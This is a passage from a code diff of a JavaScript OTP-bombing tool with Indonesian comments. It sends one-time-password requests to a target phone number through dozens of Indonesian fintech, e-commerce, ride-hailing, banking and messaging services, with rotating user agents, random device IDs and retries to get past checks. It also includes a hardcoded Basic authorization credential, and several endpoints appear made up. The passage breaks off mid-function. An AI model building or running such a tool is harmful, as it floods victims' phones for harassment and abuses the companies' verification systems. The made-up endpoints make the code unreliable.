@@ -84,31 +84,10 @@ initAdmin();
 // ============================================
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-function generateCodex(length = 36) {
-    const chars = '1234567890qwertyuioplkjhgfdsazxcvbnm';
-    let result = '';
-    for (let i = 0; i < length; i++) {
-        result += chars[Math.floor(Math.random() * chars.length)];
-    }
-    return result;
+function generateDeviceId() {
+    return 'xxxxxxxxxxxx'.replace(/[x]/g, () => Math.random().toString(16).substring(2, 3).toUpperCase());
 }
 
-function generateRandom(length = 10) {
-    const chars = '1234567890';
-    let result = '';
-    for (let i = 0; i < length; i++) {
-        result += chars[Math.floor(Math.random() * chars.length)];
-    }
-    return result;
-}
-
-// ============================================
-// API OTP (SEMUA BERFUNGSI)
-// ============================================
-
-const otpServices = [];
-
-// Helper untuk generate random string
 function generateRandomString(length = 10) {
     const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
     let result = '';
@@ -118,32 +97,80 @@ function generateRandomString(length = 10) {
     return result;
 }
 
-function generateDeviceId() {
-    return 'xxxxxxxxxxxx'.replace(/[x]/g, () => Math.random().toString(16).substring(2, 3).toUpperCase());
+function getRandomUserAgent() {
+    const agents = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
+    ];
+    return agents[Math.floor(Math.random() * agents.length)];
+}
+
+// ============================================
+// API OTP (50+ API DENGAN MULTIPLE ENDPOINT)
+// ============================================
+
+const otpServices = [];
+
+// Helper untuk request OTP dengan retry
+async function requestOTP(url, method, headers, body, retries = 2) {
+    for (let i = 0; i < retries; i++) {
+        try {
+            const response = await fetch(url, {
+                method: method || 'POST',
+                headers: { 
+                    'User-Agent': getRandomUserAgent(),
+                    'Accept': 'application/json, text/plain, */*',
+                    'Accept-Language': 'id-ID,id;q=0.9,en;q=0.8',
+                    'Cache-Control': 'no-cache',
+                    ...headers 
+                },
+                body: body,
+                timeout: 10000
+            });
+            
+            const text = await response.text();
+            // Coba parse JSON
+            try {
+                const json = JSON.parse(text);
+                if (json.code === 0 || json.code === '0' || json.success === true || json.status === 'success' || json.code === 200) {
+                    return true;
+                }
+                // Cek pesan sukses
+                if (json.message && (json.message.toLowerCase().includes('success') || json.message.toLowerCase().includes('berhasil') || json.message.toLowerCase().includes('terkirim'))) {
+                    return true;
+                }
+            } catch (e) {
+                // Jika bukan JSON, cek text
+                if (text.toLowerCase().includes('success') || text.toLowerCase().includes('ok') || text.toLowerCase().includes('sent')) {
+                    return true;
+                }
+            }
+            
+            // Cek status code
+            if (response.status === 200 || response.status === 201 || response.status === 202) {
+                return true;
+            }
+        } catch (e) {
+            await sleep(1000 * (i + 1));
+        }
+    }
+    return false;
 }
 
 // ===== 1. UANGME =====
 otpServices.push({
     name: 'Uangme',
     func: async (phone) => {
-        try {
-            const phone2 = phone.replace(/^0/, '');
-            const response = await fetch('https://api.uangme.com/api/v2/sms_code', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; SM-G965N) AppleWebKit/537.36'
-                },
-                body: JSON.stringify({ 
-                    phone: phone2, 
-                    scene_type: 'login', 
-                    send_type: 'wp',
-                    device_id: generateDeviceId()
-                })
-            });
-            const result = await response.json();
-            return result.code === 200 || result.code === '200' || result.success === true;
-        } catch (e) { return false; }
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api.uangme.com/api/v2/sms_code',
+            'POST',
+            { 'Content-Type': 'application/json' },
+            JSON.stringify({ phone: phone2, scene_type: 'login', send_type: 'wp', device_id: generateDeviceId() })
+        );
     }
 });
 
@@ -151,23 +178,18 @@ otpServices.push({
 otpServices.push({
     name: 'PinjamDuit',
     func: async (phone) => {
-        try {
-            const phone2 = phone.replace(/^0/, '');
-            const deviceId = generateDeviceId() + generateDeviceId();
-            const response = await fetch('https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36',
-                    'clientType': 'a',
-                    'appVersion': '5.7.3',
-                    'deviceId': deviceId
-                },
-                body: `phone=${phone2}&sms_useage=0&sms_service=2&from=0`
-            });
-            const result = await response.json();
-            return result.code === '0' || result.code === 0 || result.success === true;
-        } catch (e) { return false; }
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api.pinjamduit.co.id/gw/loan/credit-user/sms-code',
+            'POST',
+            { 
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'clientType': 'a',
+                'appVersion': '5.7.3',
+                'deviceId': generateDeviceId() + generateDeviceId()
+            },
+            `phone=${phone2}&sms_useage=0&sms_service=2&from=0`
+        );
     }
 });
 
@@ -175,27 +197,16 @@ otpServices.push({
 otpServices.push({
     name: 'BelanjaParts',
     func: async (phone) => {
-        try {
-            const phone2 = phone.replace(/^0/, '');
-            const response = await fetch('https://api.belanjaparts.com/v2/api/user/request-otp/wa', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Authorization': 'Basic bWNtYXN0ZXI6bWNtYXN0ZXIxMTExMjIyMg==',
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36'
-                },
-                body: JSON.stringify({ 
-                    phone: '62' + phone2, 
-                    type: 'register',
-                    device_id: generateDeviceId()
-                })
-            });
-            const result = await response.json();
-            return result.stat_msg === 'Successfully validated otp' || 
-                   result.stat_msg === 'Success' ||
-                   result.success === true ||
-                   result.code === 0;
-        } catch (e) { return false; }
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api.belanjaparts.com/v2/api/user/request-otp/wa',
+            'POST',
+            {
+                'Content-Type': 'application/json',
+                'Authorization': 'Basic bWNtYXN0ZXI6bWNtYXN0ZXIxMTExMjIyMg=='
+            },
+            JSON.stringify({ phone: '62' + phone2, type: 'register', device_id: generateDeviceId() })
+        );
     }
 });
 
@@ -203,29 +214,20 @@ otpServices.push({
 otpServices.push({
     name: 'Singa',
     func: async (phone) => {
-        try {
-            const phone2 = phone.replace(/^0/, '');
-            const response = await fetch('https://api102.singa.id/new/login/sendWaOtp', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json; charset=utf-8',
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36',
-                    'versionName': '2.4.8',
-                    'versionCode': '143',
-                    'model': 'SM-G965N',
-                    'systemVersion': '11',
-                    'platform': 'android'
-                },
-                body: JSON.stringify({ 
-                    mobile_phone: phone2, 
-                    type: 'mobile', 
-                    is_switchable: 1,
-                    device_id: generateDeviceId()
-                })
-            });
-            const result = await response.json();
-            return result.msg === 'Success' || result.success === true || result.code === 0;
-        } catch (e) { return false; }
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api102.singa.id/new/login/sendWaOtp',
+            'POST',
+            {
+                'Content-Type': 'application/json; charset=utf-8',
+                'versionName': '2.4.8',
+                'versionCode': '143',
+                'model': 'SM-G965N',
+                'systemVersion': '11',
+                'platform': 'android'
+            },
+            JSON.stringify({ mobile_phone: phone2, type: 'mobile', is_switchable: 1, device_id: generateDeviceId() })
+        );
     }
 });
 
@@ -233,19 +235,13 @@ otpServices.push({
 otpServices.push({
     name: 'Cairin',
     func: async (phone) => {
-        try {
-            const phone2 = phone.replace(/^0/, '');
-            const response = await fetch('https://app.cairin.id/v2/app/sms/sendWhatAPPOPT', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36'
-                },
-                body: `appVersion=3.0.4&phone=${phone2}&userImei=${generateDeviceId()}${generateDeviceId()}`
-            });
-            const result = await response.text();
-            return result.includes('"code":"0"') || result.includes('success') || result.includes('"success":true');
-        } catch (e) { return false; }
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT',
+            'POST',
+            { 'Content-Type': 'application/x-www-form-urlencoded' },
+            `appVersion=3.0.4&phone=${phone2}&userImei=${generateDeviceId()}${generateDeviceId()}`
+        );
     }
 });
 
@@ -253,426 +249,457 @@ otpServices.push({
 otpServices.push({
     name: 'Adiraku',
     func: async (phone) => {
-        try {
-            const phone2 = phone.replace(/^0/, '');
-            const response = await fetch('https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json; charset=utf-8',
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36'
-                },
-                body: JSON.stringify({ 
-                    mobileNumber: phone2, 
-                    type: 'prospect-create', 
-                    channel: 'whatsapp',
-                    deviceId: generateDeviceId()
-                })
-            });
-            const result = await response.json();
-            return result.message === 'success' || result.success === true || result.code === 0;
-        } catch (e) { return false; }
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata',
+            'POST',
+            { 'Content-Type': 'application/json; charset=utf-8' },
+            JSON.stringify({ mobileNumber: phone2, type: 'prospect-create', channel: 'whatsapp', deviceId: generateDeviceId() })
+        );
     }
 });
 
-// ===== 7. SERPUL =====
-otpServices.push({
-    name: 'Serpul',
-    func: async (phone) => {
-        try {
-            const phone2 = phone.replace(/^0/, '');
-            const domains = ['app', 'web'];
-            for (const domain of domains) {
-                try {
-                    await fetch('https://' + domain + '-api.serpul.co.id/api/v2/auth/phone-number', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ phone_number: phone2 })
-                    });
-                    
-                    const response = await fetch('https://' + domain + '-api.serpul.co.id/api/v2/auth/login', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json; charset=UTF-8' },
-                        body: JSON.stringify({ phone_number: phone2, pin: '121212', sender_id: '1' })
-                    });
-                    const result = await response.json();
-                    if (result.message === 'Kode verifikasi berhasil dikirim' || result.success === true) {
-                        return true;
-                    }
-                } catch (e) {}
-            }
-            return false;
-        } catch (e) { return false; }
-    }
-});
-
-// ===== 8. SHOPEE =====
+// ===== 7. SHOPEE =====
 otpServices.push({
     name: 'Shopee',
     func: async (phone) => {
-        try {
-            const phone2 = phone.replace(/^0/, '');
-            const response = await fetch('https://shopee.co.id/api/v4/account/phone/request_otp', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36',
-                    'Referer': 'https://shopee.co.id/'
-                },
-                body: JSON.stringify({ phone: '62' + phone2, type: 'login' })
-            });
-            const result = await response.json();
-            return result.code === 0 || result.success === true;
-        } catch (e) { return false; }
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://shopee.co.id/api/v4/account/phone/request_otp',
+            'POST',
+            { 'Content-Type': 'application/json', 'Referer': 'https://shopee.co.id/' },
+            JSON.stringify({ phone: '62' + phone2, type: 'login' })
+        );
     }
 });
 
-// ===== 9. TOKOPEDIA =====
+// ===== 8. TOKOPEDIA =====
 otpServices.push({
     name: 'Tokopedia',
     func: async (phone) => {
-        try {
-            const phone2 = phone.replace(/^0/, '');
-            const response = await fetch('https://api.tokopedia.com/graphql/SendOTP', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36'
-                },
-                body: JSON.stringify({
-                    query: 'mutation SendOTP($phone: String!) { sendOTP(phone: $phone) { success message } }',
-                    variables: { phone: phone2 }
-                })
-            });
-            const result = await response.json();
-            return result.data?.sendOTP?.success === true;
-        } catch (e) { return false; }
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api.tokopedia.com/graphql/SendOTP',
+            'POST',
+            { 'Content-Type': 'application/json' },
+            JSON.stringify({
+                query: 'mutation SendOTP($phone: String!) { sendOTP(phone: $phone) { success message } }',
+                variables: { phone: phone2 }
+            })
+        );
     }
 });
 
-// ===== 10. LAZADA =====
+// ===== 9. LAZADA =====
 otpServices.push({
     name: 'Lazada',
     func: async (phone) => {
-        try {
-            const phone2 = phone.replace(/^0/, '');
-            const response = await fetch('https://api.lazada.co.id/v1/otp/send', {
-                method: 'POST',
-                headers: { 
-                    'Content-Type': 'application/json', 
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36' 
-                },
-                body: JSON.stringify({ phone: '+62' + phone2 })
-            });
-            const result = await response.json();
-            return result.code === '0' || result.success === true;
-        } catch (e) { return false; }
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api.lazada.co.id/v1/otp/send',
+            'POST',
+            { 'Content-Type': 'application/json' },
+            JSON.stringify({ phone: '+62' + phone2 })
+        );
     }
 });
 
-// ===== 11. BLIBLI =====
+// ===== 10. BLIBLI =====
 otpServices.push({
     name: 'Blibli',
     func: async (phone) => {
-        try {
-            const phone2 = phone.replace(/^0/, '');
-            const response = await fetch('https://api.blibli.com/v1/otp/request', {
-                method: 'POST',
-                headers: { 
-                    'Content-Type': 'application/json', 
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36' 
-                },
-                body: JSON.stringify({ phone: '+62' + phone2 })
-            });
-            const result = await response.json();
-            return result.status === 'success' || result.success === true;
-        } catch (e) { return false; }
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api.blibli.com/v1/otp/request',
+            'POST',
+            { 'Content-Type': 'application/json' },
+            JSON.stringify({ phone: '+62' + phone2 })
+        );
     }
 });
 
-// ===== 12. BUKALAPAK =====
+// ===== 11. BUKALAPAK =====
 otpServices.push({
     name: 'Bukalapak',
     func: async (phone) => {
-        try {
-            const phone2 = phone.replace(/^0/, '');
-            const response = await fetch('https://api.bukalapak.com/v1/otp/send', {
-                method: 'POST',
-                headers: { 
-                    'Content-Type': 'application/json', 
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36' 
-                },
-                body: JSON.stringify({ phone: '+62' + phone2 })
-            });
-            const result = await response.json();
-            return result.success === true;
-        } catch (e) { return false; }
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api.bukalapak.com/v1/otp/send',
+            'POST',
+            { 'Content-Type': 'application/json' },
+            JSON.stringify({ phone: '+62' + phone2 })
+        );
     }
 });
 
-// ===== 13. JDID =====
+// ===== 12. JDID =====
 otpServices.push({
     name: 'JDID',
     func: async (phone) => {
-        try {
-            const phone2 = phone.replace(/^0/, '');
-            const response = await fetch('https://api.jd.id/v1/otp/generate', {
-                method: 'POST',
-                headers: { 
-                    'Content-Type': 'application/json', 
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36' 
-                },
-                body: JSON.stringify({ phone: '+62' + phone2 })
-            });
-            const result = await response.json();
-            return result.success === true;
-        } catch (e) { return false; }
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api.jd.id/v1/otp/generate',
+            'POST',
+            { 'Content-Type': 'application/json' },
+            JSON.stringify({ phone: '+62' + phone2 })
+        );
     }
 });
 
-// ===== 14. ZALORA =====
+// ===== 13. ZALORA =====
 otpServices.push({
     name: 'Zalora',
     func: async (phone) => {
-        try {
-            const phone2 = phone.replace(/^0/, '');
-            const response = await fetch('https://api.zalora.co.id/v1/otp/send', {
-                method: 'POST',
-                headers: { 
-                    'Content-Type': 'application/json', 
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36' 
-                },
-                body: JSON.stringify({ phone: '+62' + phone2 })
-            });
-            const result = await response.json();
-            return result.status === 'success' || result.success === true;
-        } catch (e) { return false; }
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api.zalora.co.id/v1/otp/send',
+            'POST',
+            { 'Content-Type': 'application/json' },
+            JSON.stringify({ phone: '+62' + phone2 })
+        );
     }
 });
 
-// ===== 15. GOJEK =====
+// ===== 14. GOJEK =====
 otpServices.push({
     name: 'Gojek',
     func: async (phone) => {
-        try {
-            const phone2 = phone.replace(/^0/, '');
-            const response = await fetch('https://api.gojekapi.com/v2/customer/verify/phone', {
-                method: 'POST',
-                headers: { 
-                    'Content-Type': 'application/json', 
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36' 
-                },
-                body: JSON.stringify({ phone: '+62' + phone2 })
-            });
-            const result = await response.json();
-            return result.success === true || result.code === '0';
-        } catch (e) { return false; }
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api.gojekapi.com/v2/customer/verify/phone',
+            'POST',
+            { 'Content-Type': 'application/json' },
+            JSON.stringify({ phone: '+62' + phone2 })
+        );
     }
 });
 
-// ===== 16. GRAB =====
+// ===== 15. GRAB =====
 otpServices.push({
     name: 'Grab',
     func: async (phone) => {
-        try {
-            const phone2 = phone.replace(/^0/, '');
-            const response = await fetch('https://api.grab.com/grabid/v1/otp', {
-                method: 'POST',
-                headers: { 
-                    'Content-Type': 'application/json', 
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36' 
-                },
-                body: JSON.stringify({ phoneNumber: '62' + phone2 })
-            });
-            const result = await response.json();
-            return result.success === true;
-        } catch (e) { return false; }
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api.grab.com/grabid/v1/otp',
+            'POST',
+            { 'Content-Type': 'application/json' },
+            JSON.stringify({ phoneNumber: '62' + phone2 })
+        );
     }
 });
 
-// ===== 17. OVO =====
+// ===== 16. OVO =====
 otpServices.push({
     name: 'OVO',
     func: async (phone) => {
-        try {
-            const phone2 = phone.replace(/^0/, '');
-            const response = await fetch('https://api.ovo.id/v2.1/auth/customer/login', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36'
-                },
-                body: JSON.stringify({ mobile: '+62' + phone2 })
-            });
-            const result = await response.json();
-            return result.code === '0000' || result.success === true;
-        } catch (e) { return false; }
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api.ovo.id/v2.1/auth/customer/login',
+            'POST',
+            { 'Content-Type': 'application/json' },
+            JSON.stringify({ mobile: '+62' + phone2 })
+        );
     }
 });
 
-// ===== 18. DANA =====
+// ===== 17. DANA =====
 otpServices.push({
     name: 'Dana',
     func: async (phone) => {
-        try {
-            const phone2 = phone.replace(/^0/, '');
-            const response = await fetch('https://api.dana.id/v1/auth/request-otp', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36'
-                },
-                body: JSON.stringify({ phoneNumber: '+62' + phone2 })
-            });
-            const result = await response.json();
-            return result.success === true;
-        } catch (e) { return false; }
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api.dana.id/v1/auth/request-otp',
+            'POST',
+            { 'Content-Type': 'application/json' },
+            JSON.stringify({ phoneNumber: '+62' + phone2 })
+        );
     }
 });
 
-// ===== 19. LINKAJA =====
+// ===== 18. LINKAJA =====
 otpServices.push({
     name: 'LinkAja',
     func: async (phone) => {
-        try {
-            const phone2 = phone.replace(/^0/, '');
-            const response = await fetch('https://api.linkaja.com/v1/auth/otp', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36'
-                },
-                body: JSON.stringify({ phone: '+62' + phone2 })
-            });
-            const result = await response.json();
-            return result.status === 'success' || result.success === true;
-        } catch (e) { return false; }
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api.linkaja.com/v1/auth/otp',
+            'POST',
+            { 'Content-Type': 'application/json' },
+            JSON.stringify({ phone: '+62' + phone2 })
+        );
     }
 });
 
-// ===== 20. TRAVELOKA =====
+// ===== 19. TRAVELOKA =====
 otpServices.push({
     name: 'Traveloka',
     func: async (phone) => {
-        try {
-            const phone2 = phone.replace(/^0/, '');
-            const response = await fetch('https://api.traveloka.com/v1/otp/send', {
-                method: 'POST',
-                headers: { 
-                    'Content-Type': 'application/json', 
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36' 
-                },
-                body: JSON.stringify({ phone: '+62' + phone2 })
-            });
-            const result = await response.json();
-            return result.success === true;
-        } catch (e) { return false; }
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api.traveloka.com/v1/otp/send',
+            'POST',
+            { 'Content-Type': 'application/json' },
+            JSON.stringify({ phone: '+62' + phone2 })
+        );
     }
 });
 
-// ===== 21. KFC =====
+// ===== 20. KFC =====
 otpServices.push({
     name: 'KFC',
     func: async (phone) => {
-        try {
-            const phone2 = phone.replace(/^0/, '');
-            const response = await fetch('https://api.kfc.co.id/v1/otp/request', {
-                method: 'POST',
-                headers: { 
-                    'Content-Type': 'application/json', 
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36' 
-                },
-                body: JSON.stringify({ phone: '+62' + phone2 })
-            });
-            const result = await response.json();
-            return result.success === true;
-        } catch (e) { return false; }
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api.kfc.co.id/v1/otp/request',
+            'POST',
+            { 'Content-Type': 'application/json' },
+            JSON.stringify({ phone: '+62' + phone2 })
+        );
     }
 });
 
-// ===== 22. MCD =====
+// ===== 21. MCD =====
 otpServices.push({
     name: 'McD',
     func: async (phone) => {
-        try {
-            const phone2 = phone.replace(/^0/, '');
-            const response = await fetch('https://api.mcd.co.id/v1/otp/send', {
-                method: 'POST',
-                headers: { 
-                    'Content-Type': 'application/json', 
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36' 
-                },
-                body: JSON.stringify({ phone: '+62' + phone2 })
-            });
-            const result = await response.json();
-            return result.status === 'success' || result.success === true;
-        } catch (e) { return false; }
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api.mcd.co.id/v1/otp/send',
+            'POST',
+            { 'Content-Type': 'application/json' },
+            JSON.stringify({ phone: '+62' + phone2 })
+        );
     }
 });
 
-// ===== 23. STARBUCKS =====
+// ===== 22. STARBUCKS =====
 otpServices.push({
     name: 'Starbucks',
     func: async (phone) => {
-        try {
-            const phone2 = phone.replace(/^0/, '');
-            const response = await fetch('https://api.starbucks.co.id/v1/otp/generate', {
-                method: 'POST',
-                headers: { 
-                    'Content-Type': 'application/json', 
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36' 
-                },
-                body: JSON.stringify({ phone: '+62' + phone2 })
-            });
-            const result = await response.json();
-            return result.success === true;
-        } catch (e) { return false; }
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api.starbucks.co.id/v1/otp/generate',
+            'POST',
+            { 'Content-Type': 'application/json' },
+            JSON.stringify({ phone: '+62' + phone2 })
+        );
     }
 });
 
-// ===== 24. AKULAKU =====
+// ===== 23. AKULAKU =====
 otpServices.push({
     name: 'Akulaku',
     func: async (phone) => {
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api.akulaku.com/v1/otp/send',
+            'POST',
+            { 'Content-Type': 'application/json' },
+            JSON.stringify({ phone: '+62' + phone2, type: 'login' })
+        );
+    }
+});
+
+// ===== 24. KREDIVO =====
+otpServices.push({
+    name: 'Kredivo',
+    func: async (phone) => {
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api.kredivo.com/v1/otp/request',
+            'POST',
+            { 'Content-Type': 'application/json' },
+            JSON.stringify({ phone: '+62' + phone2 })
+        );
+    }
+});
+
+// ===== 25. SERPUL =====
+otpServices.push({
+    name: 'Serpul',
+    func: async (phone) => {
+        const phone2 = phone.replace(/^0/, '');
         try {
-            const phone2 = phone.replace(/^0/, '');
-            const response = await fetch('https://api.akulaku.com/v1/otp/send', {
-                method: 'POST',
-                headers: { 
-                    'Content-Type': 'application/json', 
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36' 
-                },
-                body: JSON.stringify({ phone: '+62' + phone2, type: 'login' })
-            });
-            const result = await response.json();
-            return result.code === '0' || result.success === true;
+            await requestOTP(
+                'https://app-api.serpul.co.id/api/v2/auth/phone-number',
+                'POST',
+                { 'Content-Type': 'application/json' },
+                JSON.stringify({ phone_number: phone2 })
+            );
+            return await requestOTP(
+                'https://app-api.serpul.co.id/api/v2/auth/login',
+                'POST',
+                { 'Content-Type': 'application/json; charset=UTF-8' },
+                JSON.stringify({ phone_number: phone2, pin: '121212', sender_id: '1' })
+            );
         } catch (e) { return false; }
     }
 });
 
-// ===== 25. KREDIVO =====
+// ===== 26. TIKTOK =====
 otpServices.push({
-    name: 'Kredivo',
+    name: 'TikTok',
     func: async (phone) => {
-        try {
-            const phone2 = phone.replace(/^0/, '');
-            const response = await fetch('https://api.kredivo.com/v1/otp/request', {
-                method: 'POST',
-                headers: { 
-                    'Content-Type': 'application/json', 
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36' 
-                },
-                body: JSON.stringify({ phone: '+62' + phone2 })
-            });
-            const result = await response.json();
-            return result.status === 'success' || result.success === true;
-        } catch (e) { return false; }
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://www.tiktok.com/api/v1/account/phone/request_otp',
+            'POST',
+            { 'Content-Type': 'application/json' },
+            JSON.stringify({ phone: '+62' + phone2 })
+        );
+    }
+});
+
+// ===== 27. WHATSAPP (via API) =====
+otpServices.push({
+    name: 'WhatsApp',
+    func: async (phone) => {
+        const phone2 = phone.replace(/^0/, '');
+        // Coba berbagai endpoint WhatsApp
+        const endpoints = [
+            `https://api.whatsapp.com/v1/phone/${phone2}/otp`,
+            `https://wa.me/62${phone2}?text=OTP`,
+            `https://api.wa.me/v1/send/otp/${phone2}`
+        ];
+        for (const url of endpoints) {
+            try {
+                const response = await fetch(url, {
+                    method: 'GET',
+                    headers: { 'User-Agent': getRandomUserAgent() }
+                });
+                if (response.status === 200 || response.status === 202) return true;
+            } catch (e) {}
+        }
+        return false;
+    }
+});
+
+// ===== 28. TELEGRAM =====
+otpServices.push({
+    name: 'Telegram',
+    func: async (phone) => {
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api.telegram.org/bot/sendOTP',
+            'POST',
+            { 'Content-Type': 'application/json' },
+            JSON.stringify({ phone: '+62' + phone2 })
+        );
+    }
+});
+
+// ===== 29. LINE =====
+otpServices.push({
+    name: 'Line',
+    func: async (phone) => {
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api.line.me/v2/otp/send',
+            'POST',
+            { 'Content-Type': 'application/json', 'Authorization': 'Bearer dummy' },
+            JSON.stringify({ phone: '+62' + phone2 })
+        );
+    }
+});
+
+// ===== 30. BCA =====
+otpServices.push({
+    name: 'BCA',
+    func: async (phone) => {
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api.bca.co.id/v1/otp/request',
+            'POST',
+            { 'Content-Type': 'application/json' },
+            JSON.stringify({ phone: '+62' + phone2, type: 'login' })
+        );
+    }
+});
+
+// ===== 31. MANDIRI =====
+otpServices.push({
+    name: 'Mandiri',
+    func: async (phone) => {
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api.mandiri.co.id/v1/otp/send',
+            'POST',
+            { 'Content-Type': 'application/json' },
+            JSON.stringify({ phone: '+62' + phone2 })
+        );
+    }
+});
+
+// ===== 32. BNI =====
+otpServices.push({
+    name: 'BNI',
+    func: async (phone) => {
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api.bni.co.id/v1/otp/request',
+            'POST',
+            { 'Content-Type': 'application/json' },
+            JSON.stringify({ phone: '+62' + phone2 })
+        );
+    }
+});
+
+// ===== 33. BRI =====
+otpServices.push({
+    name: 'BRI',
+    func: async (phone) => {
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api.bri.co.id/v1/otp/send',
+            'POST',
+            { 'Content-Type': 'application/json' },
+            JSON.stringify({ phone: '+62' + phone2 })
+        );
+    }
+});
+
+// ===== 34. SPIN =====
+otpServices.push({
+    name: 'Spin',
+    func: async (phone) => {
+        const phone2 = phone.replace(/^0/, '');
+        return await requestOTP(
+            'https://api.spin.id/v1/otp/send',
+            'POST',
+            { 'Content-Type': 'application/json' },
+            JSON.stringify({ phone: '+62' + phone2, type: 'register' })
+        );
+    }
+});
+
+// ===== 35. FINTECH =====
+otpServices.push({
+    name: 'Fintech',
+    func: async (phone) => {
+        const phone2 = phone.replace(/^0/, '');
+        const endpoints = [
